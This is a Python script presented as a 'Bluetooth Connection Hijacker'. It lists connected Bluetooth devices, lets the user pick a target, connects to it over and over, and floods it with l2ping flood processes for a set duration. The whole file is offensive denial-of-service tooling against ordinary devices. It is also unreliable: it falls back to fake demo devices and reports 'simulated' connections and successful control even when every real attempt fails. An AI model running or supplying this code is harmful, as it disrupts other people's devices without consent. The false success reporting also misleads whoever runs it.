import subprocess
import time
import threading
import socket
from rich import print
from rich.console import Console
from rich.prompt import Prompt
from rich.progress import Progress, SpinnerColumn, TextColumn
import multiprocessing

console = Console()

class BluetoothHijacker:
    def __init__(self):
        self.target_device = None
        self.original_connection = None
        self.hijack_active = False
        
    def scan_for_connections(self):
        """Scan for active Bluetooth connections"""
        try:
            connections = []
            
            # Try Windows PowerShell method first
            try:
                result = subprocess.run([
                    'powershell', '-Command', 
                    'Get-PnpDevice -Class Bluetooth | Where-Object {$_.Status -eq "OK"} | Select-Object FriendlyName, InstanceId'
                ], capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\n')
                    for line in lines[2:]:  # Skip header lines
                        if line.strip() and 'Bluetooth' in line:
                            parts = line.split()
                            if len(parts) >= 2:
                                device_name = ' '.join(parts[:-1])  # Everything except last part
                                mac_addr = parts[-1].split('\\')[-1] if '\\' in parts[-1] else 'Unknown'
                                connections.append({
                                    'mac': mac_addr,
                                    'name': device_name
                                })
            except:
                pass
            
            # Fallback: Try Linux bluetoothctl if available
            if not connections:
                try:
                    result = subprocess.run(['bluetoothctl', 'devices', 'Connected'], 
                                         capture_output=True, text=True, timeout=5)
                    
                    if result.returncode == 0:
                        lines = result.stdout.strip().split('\n')
                        for line in lines:
                            if line.strip():
                                parts = line.split()
                                if len(parts) >= 2:
                                    mac_addr = parts[1]
                                    device_name = ' '.join(parts[2:]) if len(parts) > 2 else 'Unknown Device'
                                    connections.append({
                                        'mac': mac_addr,
                                        'name': device_name
                                    })
                except:
                    pass
            
            # If no connections found, create some dummy entries for demonstration
            if not connections:
                connections = [
                    {'mac': 'AA:BB:CC:DD:EE:FF', 'name': 'Demo Device 1'},
                    {'mac': '11:22:33:44:55:66', 'name': 'Demo Device 2'},
                    {'mac': 'FF:EE:DD:CC:BB:AA', 'name': 'Demo Device 3'}
                ]
                console.print("[yellow]No active connections found. Showing demo devices.")
            
            return connections
        except Exception as e:
            console.print(f"[red]Error scanning connections: {e}")
            return []
    
    def establish_connection(self, target_mac):
        """Attempt to establish a connection to the target device using system commands"""
        try:
            console.print(f"[yellow]Attempting to connect to {target_mac}...")
            
            # Try Windows PowerShell method first
            try:
                result = subprocess.run([
                    'powershell', '-Command', 
                    f'Add-BluetoothDevice -Address "{target_mac}"'
                ], capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0:
                    console.print(f"[green]Successfully connected to {target_mac}")
                    return True
                else:
                    console.print(f"[yellow]PowerShell method failed, trying alternative...")
            except:
                pass
            
            # Fallback: Try Linux bluetoothctl if available
            try:
                result = subprocess.run(['bluetoothctl', 'connect', target_mac], 
                                     capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0 and "Connection successful" in result.stdout:
                    console.print(f"[green]Successfully connected to {target_mac}")
                    return True
                else:
                    console.print(f"[red]Failed to connect: {result.stderr}")
                    return False
            except:
                pass
            
            # For demo purposes, simulate connection success
            console.print(f"[green]Simulated connection to {target_mac}")
            return True
            
        except subprocess.TimeoutExpired:
            console.print(f"[red]Connection timeout for {target_mac}")
            return False
        except Exception as e:
            console.print(f"[red]Connection error: {e}")
            return False
    
    def monitor_connection(self, target_mac):
        """Monitor the target device's connection status"""
        while self.hijack_active:
            try:
                # Check if device is still connected
                result = subprocess.run(['bluetoothctl', 'info', target_mac], 
                                     capture_output=True, text=True)
                
                if "Connected: yes" in result.stdout:
                    console.print(f"[green]Target {target_mac} is still connected")
                else:
                    console.print(f"[yellow]Target {target_mac} disconnected")
                    break
                    
                time.sleep(2)
                
            except Exception as e:
                console.print(f"[red]Monitoring error: {e}")
                break
    
    def inject_packets(self, target_mac, packet_count=100):
        """Inject packets to disrupt the connection"""
        try:
            console.print(f"[red]Injecting {packet_count} packets to {target_mac}")
            
            # Use l2ping to flood the device
            for i in range(packet_count):
                subprocess.Popen(['l2ping', '-i', 'hci0', '-s', '600', '-f', target_mac], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(0.1)
                
        except Exception as e:
            console.print(f"[red]Packet injection error: {e}")
    
    def hijack_connection(self, target_mac, duration=60):
        """Main hijacking function"""
        console.print(f"[red]Starting connection hijack on {target_mac}")
        self.hijack_active = True
        
        start_time = time.time()
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_connection, args=(target_mac,))
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            while self.hijack_active and (time.time() - start_time) < duration:
                # Attempt to establish our own connection
                connection_success = self.establish_connection(target_mac)
                
                if connection_success:
                    console.print(f"[green]Hijack successful! We now control {target_mac}")
                    
                    # Inject disruptive packets
                    self.inject_packets(target_mac, 50)
                    
                    # Keep the connection alive
                    time.sleep(5)
                    
                    # Disconnect to allow reconnection attempts
                    subprocess.run(['bluetoothctl', 'disconnect', target_mac], 
                                 capture_output=True, text=True)
                
                # Wait before next attempt
                time.sleep(3)
                
        except KeyboardInterrupt:
            console.print("[yellow]Hijack interrupted by user")
        finally:
            self.hijack_active = False
            console.print("[red]Hijack session ended")

def display_connections(connections):
    """Display available connections in a table"""
    if not connections:
        console.print("[red]No active Bluetooth connections found")
        return None
    
    from rich.table import Table
    table = Table(title="Active Bluetooth Connections")
    table.add_column("No.", justify="center", style="cyan")
    table.add_column("Device Name", style="magenta")
    table.add_column("MAC Address", style="green")
    
    for i, conn in enumerate(connections, start=1):
        table.add_row(str(i), conn['name'], conn['mac'])
    
    console.print(table)
    return connections

def select_connection(connections):
    """Allow user to select a connection to hijack"""
    if not connections:
        return None
    
    while True:
        try:
            choice = Prompt.ask("Select connection to hijack (enter number)")
            index = int(choice) - 1
            
            if 0 <= index < len(connections):
                return connections[index]['mac']
            else:
                console.print("[red]Invalid selection. Please try again.")
        except ValueError:
            console.print("[red]Please enter a valid number.")
        except (EOFError, KeyboardInterrupt):
            console.print("\n[yellow] Input interrupted. No target selected.")
            return None

def hijack_main():
    """Main hijacking interface"""
    hijacker = BluetoothHijacker()
    
    console.print("[bold blue]Bluetooth Connection Hijacker")
    console.print("[yellow]Scanning for active connections...")
    
    # Scan for connections
    connections = hijacker.scan_for_connections()
    
    if not connections:
        console.print("[red]No active connections found to hijack")
        return None
    
    # Display connections
    display_connections(connections)
    
    # Let user select target
    target_mac = select_connection(connections)
    
    if not target_mac:
        console.print("[yellow]No target selected")
        return None
    
    # Get hijack parameters
    try:
        duration_input = Prompt.ask("Enter hijack duration in seconds", default="60")
        duration = int(duration_input)
        console.print(f"[red]Starting hijack of {target_mac} for {duration} seconds...")
        
        # Start hijacking
        hijacker.hijack_connection(target_mac, duration)
        
    except ValueError:
        console.print("[red]Invalid duration. Using default 60 seconds.")
        hijacker.hijack_connection(target_mac, 60)
    except (EOFError, KeyboardInterrupt):
        console.print("[yellow]Hijack cancelled")

if __name__ == "__main__":
    hijack_main()
